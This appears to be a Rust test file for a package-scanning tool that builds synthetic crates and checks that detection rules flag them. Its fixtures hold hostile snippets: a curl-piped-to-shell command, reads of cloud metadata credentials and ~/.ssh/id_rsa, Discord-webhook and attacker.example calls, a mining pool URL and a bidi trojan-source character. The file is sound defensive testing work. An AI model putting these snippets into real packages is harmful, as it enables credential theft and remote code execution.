//! End-to-end cargo-rule tests against synthetic `.crate` files.

use flate2::write::GzEncoder;
use flate2::Compression;
use monomi_cargo::CargoEcosystem;
use monomi_core::{
    AnalysisCtx, ArtifactId, Corpus, Ecosystem, EcosystemId, HashAlgo, Integrity, Stage1Verdict,
};
use monomi_rules::{default_ruleset, run};
use tar::{Builder, Header};

fn build_crate(prefix: &str, files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut gz = GzEncoder::new(Vec::new(), Compression::default());
    {
        let mut b = Builder::new(&mut gz);
        for (path, data) in files {
            let full = format!("{prefix}/{path}");
            let mut h = Header::new_gnu();
            h.set_path(&full).unwrap();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append(&h, *data).unwrap();
        }
        b.finish().unwrap();
    }
    gz.finish().unwrap()
}

fn analyze(bytes: Vec<u8>) -> monomi_core::Stage1Result {
    let tar = monomi_core::Tarball {
        source_url: None,
        bytes,
    };
    let eco = CargoEcosystem::new();
    let manifest = eco.parse_manifest(&tar).unwrap();
    let lifecycle = eco.lifecycle_entrypoints(&tar, &manifest).unwrap();
    let entries = eco.walk(&tar).unwrap();
    let artifact = ArtifactId {
        ecosystem: EcosystemId::Cargo,
        name: manifest.name.clone(),
        version: manifest.version.clone(),
        integrity: Integrity::from_bytes(HashAlgo::Sha256, &tar.bytes),
    };
    let corpus = Corpus::default();
    let ctx = AnalysisCtx {
        artifact: &artifact,
        manifest: &manifest,
        lifecycle: &lifecycle,
        entries: &entries,
        diff: None,
        registry: None,
        corpus: &corpus,
    };
    run(&default_ruleset(), &ctx).stage1
}

#[test]
fn clean_crate_is_clean() {
    let cargo_toml = br#"
[package]
name = "clean-crate"
version = "0.1.0"
    "#;
    let bytes = build_crate(
        "clean-crate-0.1.0",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            (
                "src/lib.rs",
                b"pub fn add(a: u32, b: u32) -> u32 { a + b }".as_slice(),
            ),
        ],
    );
    let s = analyze(bytes);
    assert!(s.findings.is_empty(), "got findings: {:?}", s.findings);
    assert_eq!(s.verdict, Stage1Verdict::Clean);
}

#[test]
fn build_rs_dangerous_api_fires_cargo002() {
    let cargo_toml = br#"
[package]
name = "spawner"
version = "0.0.1"
    "#;
    let build_rs = b"fn main() { std::process::Command::new(\"curl\").arg(\"http://evil/\").status().unwrap(); }";
    let bytes = build_crate(
        "spawner-0.0.1",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("build.rs", build_rs.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"CARGO001"), "expected CARGO001, got {ids:?}");
    assert!(ids.contains(&"CARGO002"), "expected CARGO002, got {ids:?}");
}

#[test]
fn cloud_metadata_in_rust_source_is_blocked() {
    let cargo_toml = br#"
[package]
name = "stealer"
version = "0.0.1"
    "#;
    let src = br#"
pub async fn grab_iam() {
    let _ = reqwest::get("http://169.254.169.254/latest/meta-data/iam/security-credentials/").await;
}
    "#;
    let bytes = build_crate(
        "stealer-0.0.1",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", src.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        ids.contains(&"NPM006"),
        "expected NPM006 to fire on cargo too, got {ids:?}"
    );
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn discord_webhook_in_build_rs_is_blocked() {
    let cargo_toml = br#"
[package]
name = "leaker"
version = "0.0.1"
    "#;
    let build_rs = br#"
fn main() {
    let _ = reqwest::blocking::Client::new()
        .post("https://discord.com/api/webhooks/12345/abcdef")
        .send();
}
    "#;
    let bytes = build_crate(
        "leaker-0.0.1",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("build.rs", build_rs.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"NPM007"), "expected NPM007, got {ids:?}");
    // NPM007 is decisive critical → Malicious regardless of other findings.
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn proc_macro_crate_fires_cargo003() {
    let cargo_toml = br#"
[package]
name = "shady-derive"
version = "0.0.1"

[lib]
proc-macro = true
    "#;
    let bytes = build_crate(
        "shady-derive-0.0.1",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", b"pub fn x() {}".as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"CARGO003"), "expected CARGO003, got {ids:?}");
}

#[test]
fn include_bytes_in_build_rs_fires_cargo004() {
    let cargo_toml = br#"
[package]
name = "embeds-payload"
version = "0.0.1"
    "#;
    let build_rs =
        b"fn main() { let p = include_bytes!(\"payload.bin\"); println!(\"{}\", p.len()); }";
    let bytes = build_crate(
        "embeds-payload-0.0.1",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("build.rs", build_rs.as_slice()),
            ("payload.bin", b"\x00\x01\x02\x03".as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"CARGO004"), "expected CARGO004, got {ids:?}");
}

#[test]
fn bidi_override_in_rust_source_is_blocked() {
    let cargo_toml = br#"
[package]
name = "trojan-source-rs"
version = "0.0.1"
    "#;
    // U+202E RLO inside src.
    let src = "pub fn x() {\u{202E} /* hidden */ }";
    let bytes = build_crate(
        "trojan-source-rs-0.0.1",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", src.as_bytes()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        ids.contains(&"NPM022"),
        "expected NPM022 (cross-eco), got {ids:?}"
    );
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn stratum_url_in_rust_source_is_blocked() {
    let cargo_toml = br#"
[package]
name = "minerlib-rs"
version = "0.0.1"
    "#;
    let src = "pub const POOL: &str = \"stratum+tcp://pool.minexmr.com:4444\";";
    let bytes = build_crate(
        "minerlib-rs-0.0.1",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", src.as_bytes()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        ids.contains(&"NPM024"),
        "expected NPM024 (cross-eco), got {ids:?}"
    );
    assert_eq!(s.verdict, Stage1Verdict::Malicious);
}

#[test]
fn ssh_path_in_rust_source_is_blocked() {
    let cargo_toml = br#"
[package]
name = "key-thief"
version = "0.0.1"
    "#;
    let src = br#"
pub fn read_key() -> std::io::Result<String> {
    let p = format!("{}/.ssh/id_rsa", std::env::var("HOME").unwrap());
    std::fs::read_to_string(p)
}
    "#;
    let bytes = build_crate(
        "key-thief-0.0.1",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", src.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(
        ids.contains(&"NPM008"),
        "expected NPM008 to fire on cargo too, got {ids:?}"
    );
    // High + defers_to_stage2 → Suspicious; Stage 2 LLM is the
    // arbiter for whether the access is legitimate.
    assert_eq!(s.verdict, Stage1Verdict::Suspicious);
}

#[test]
fn proc_macro_with_no_dangerous_apis_only_fires_cargo003() {
    // Plain proc-macro crate (CARGO003) but body is benign — the
    // new CARGO005/6/7 rules must NOT fire.
    let cargo_toml = br#"
[package]
name = "clean-derive"
version = "0.1.0"

[lib]
proc-macro = true
    "#;
    let src = b"
use proc_macro::TokenStream;

#[proc_macro_derive(MyTrait)]
pub fn derive_my_trait(_input: TokenStream) -> TokenStream {
    TokenStream::new()
}
";
    let bytes = build_crate(
        "clean-derive-0.1.0",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", src.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: std::collections::HashSet<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains("CARGO003"));
    assert!(!ids.contains("CARGO005"));
    assert!(!ids.contains("CARGO006"));
    assert!(!ids.contains("CARGO007"));
}

#[test]
fn proc_macro_source_with_process_spawn_fires_cargo005() {
    let cargo_toml = br#"
[package]
name = "evil-derive"
version = "0.1.0"

[lib]
proc-macro = true
    "#;
    let src = b"
use proc_macro::TokenStream;
use std::process::Command;

#[proc_macro_derive(Evil)]
pub fn derive(_: TokenStream) -> TokenStream {
    let _ = Command::new(\"/bin/sh\").arg(\"-c\").arg(\"curl http://x | sh\").spawn();
    TokenStream::new()
}
";
    let bytes = build_crate(
        "evil-derive-0.1.0",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", src.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"CARGO005"), "got {ids:?}");
}

#[test]
fn proc_macro_source_with_network_fires_cargo007() {
    let cargo_toml = br#"
[package]
name = "phone-home-derive"
version = "0.1.0"

[lib]
proc-macro = true
    "#;
    let src = b"
use proc_macro::TokenStream;

#[proc_macro_derive(PhoneHome)]
pub fn derive(_: TokenStream) -> TokenStream {
    let _ = reqwest::blocking::get(\"http://attacker.example/x\");
    TokenStream::new()
}
";
    let bytes = build_crate(
        "phone-home-derive-0.1.0",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", src.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(ids.contains(&"CARGO007"), "got {ids:?}");
}

#[test]
fn non_proc_macro_with_network_does_not_fire_cargo007() {
    // Same `reqwest::` literal but the crate is NOT a proc-macro —
    // ordinary library code uses reqwest legitimately.
    let cargo_toml = br#"
[package]
name = "ordinary-lib"
version = "0.1.0"
    "#;
    let src = b"
pub fn fetch() {
    let _ = reqwest::blocking::get(\"http://example.com\");
}
";
    let bytes = build_crate(
        "ordinary-lib-0.1.0",
        &[
            ("Cargo.toml", cargo_toml.as_slice()),
            ("src/lib.rs", src.as_slice()),
        ],
    );
    let s = analyze(bytes);
    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
    assert!(!ids.contains(&"CARGO007"), "CARGO007 should be proc-macro-only, got {ids:?}");
}
